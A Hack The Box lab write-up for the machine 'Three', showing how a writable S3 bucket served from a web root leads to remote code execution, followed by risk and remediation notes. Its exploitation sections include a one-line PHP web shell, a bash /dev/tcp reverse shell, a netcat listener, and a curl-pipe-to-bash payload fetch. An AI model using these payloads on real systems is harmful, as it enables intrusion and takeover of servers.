# Hack The Box - Three

| Property | Value |
|----------|-------|
| **Machine** | Three |
| **Platform** | Hack The Box |
| **Difficulty** | Very Easy |
| **Target IP** | `10.129.114.141` |
| **Operating System** | Linux |

---

## Objective

Three is a **very easy** Linux machine that demonstrates how a **misconfigured AWS S3 bucket** can lead to **Remote Code Execution (RCE)**. The objective is to enumerate the target website, discover the hidden S3 subdomain, exploit the insecure bucket configuration by uploading a PHP web shell, and obtain remote access to the target system.

---

## Enumeration

### Host Configuration

Since the target uses a name-based virtual host, add the hostname to the local hosts file.

<img width="456" height="214" alt="image" src="https://github.com/user-attachments/assets/0f7cad50-11aa-42b4-bda2-63b5f8b0dd8b" />


---

### Website Enumeration

Browse to the target website.

<img width="759" height="450" alt="image" src="https://github.com/user-attachments/assets/063c9429-bbad-4ec7-9a10-85e8b48fa819" />


---

### Nmap Scan

Identify the exposed services.

<img width="660" height="256" alt="image" src="https://github.com/user-attachments/assets/9c417549-4b66-4a54-be6b-174d8fc8b388" />


| Port | State | Service | Version |
|------|------|---------|---------|
| 22 | Open | SSH | OpenSSH 7.6p1 Ubuntu |
| 80 | Open | HTTP | Apache httpd 2.4.29 (Ubuntu) |

### Analysis

The target exposes an HTTP service and an SSH service. Since no immediate vulnerabilities were identified through version enumeration, further web application enumeration was performed.

---

## Virtual Host Enumeration

Use **Gobuster** to enumerate virtual hosts.

```text
gobuster vhost \
-u http://thetoppers.htb \
-w /home/ashutosh/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
--append-domain
```

<img width="605" height="341" alt="image" src="https://github.com/user-attachments/assets/040ca456-d7a4-408e-b883-58d20595abe8" />


The scan discovered the hidden virtual host:

```text
s3.thetoppers.htb
```

Visit the newly discovered subdomain.

<img width="554" height="125" alt="image" src="https://github.com/user-attachments/assets/65916361-476d-443b-b563-a7e751e92ad4" />


---

## Exploitation

### AWS CLI Enumeration

Interact with the S3-compatible storage using the AWS CLI.

Configure the AWS client.

```text
aws configure
```

List the available buckets.

```text
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

List the contents of the bucket.

```text
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
<img width="564" height="245" alt="image" src="https://github.com/user-attachments/assets/6f1ecac0-1512-404b-91b2-cf7a0d086840" />


Enumeration confirmed that the bucket contained the website files.

---

### Testing for Remote Code Execution

Create a simple PHP web shell.

```php
<?php system($_GET["cmd"]); ?>
```

Save it as:

```text
shell.php
```

Upload the file to the bucket.

```text
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

<img width="648" height="36" alt="image" src="https://github.com/user-attachments/assets/ff93cb58-4845-47a4-85a7-41521965e0e6" />


Execute a test command.

```text
http://thetoppers.htb/shell.php?cmd=id
```

<img width="698" height="118" alt="image" src="https://github.com/user-attachments/assets/e09b6ed8-6791-427f-94f2-aa2d9893eac1" />


The response returned:

```text
uid=33(www-data)
```

confirming successful **Remote Code Execution**.

---

## Reverse Shell

Create a Bash reverse shell.

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR-IP>/1337 0>&1
```

---

### Start a Netcat Listener

```text
nc -nvlp 1337
```

<img width="233" height="34" alt="image" src="https://github.com/user-attachments/assets/e825822f-1b50-4724-924b-07ff62b20271" />


---

### Host the Payload

Start a temporary HTTP server.

```text
python3 -m http.server 8000
```

<img width="490" height="34" alt="image" src="https://github.com/user-attachments/assets/80a1c4d9-be90-4f19-80e3-19fc3a828541" />


---

### Execute the Reverse Shell

Trigger the payload using the PHP web shell.

```text
http://thetoppers.htb/shell.php?cmd=curl%20http://<YOUR-IP>:8000/shell.sh%20|%20bash
```

Once the connection is established, retrieve the flag.

```text
cat /var/www/flag.txt
```

<img width="633" height="324" alt="image" src="https://github.com/user-attachments/assets/7ed3e295-f066-45e0-8e04-813b0f8e0fda" />


> **Note**
>
> The target IP changed after the HTB instance was respawned.

---

## Risk Analysis

### Finding: Misconfigured S3 Bucket Leading to Remote Code Execution

**Severity:** Critical

**Risk**

The S3 bucket permitted unauthorized file uploads and was directly linked to the web server's document root. This allowed arbitrary PHP files to be uploaded and executed.

**Impact**

- Remote Code Execution (RCE)
- Arbitrary operating system command execution
- Reverse shell access
- Unauthorized access to sensitive files
- Complete compromise of the web application

**Remediation**

- Disable anonymous write access to the S3 bucket.
- Apply the principle of least privilege to bucket policies.
- Prevent executable files (such as PHP) from being uploaded.
- Separate cloud storage from the web server's document root.
- Restrict uploaded file types.
- Regularly audit S3 bucket permissions.

---

## Root Cause

The S3-compatible storage bucket was **misconfigured** with insufficient access controls, allowing unauthorized users to upload arbitrary files. Since the uploaded files were stored inside the web server's document root and interpreted by PHP, arbitrary code execution became possible.

---

## Evidence

Successful exploitation was confirmed by:

- Gobuster discovered the hidden virtual host **s3.thetoppers.htb**.
- AWS CLI enumeration revealed the website bucket.
- A PHP web shell was successfully uploaded.
- Executing `shell.php?cmd=id` returned **uid=33(www-data)**.
- A reverse shell was successfully established.
- The target filesystem and **flag.txt** were successfully accessed.

---

## Conclusion

The **Three** machine demonstrates how a **misconfigured cloud storage bucket** can lead to complete compromise of a web application. By discovering the hidden S3 bucket, uploading a PHP web shell, and executing arbitrary commands, Remote Code Execution was achieved. The obtained command execution was then leveraged to establish a reverse shell and gain access to sensitive files. This machine highlights the importance of properly securing cloud storage, restricting file uploads, and preventing executable content from being served directly by web applications.
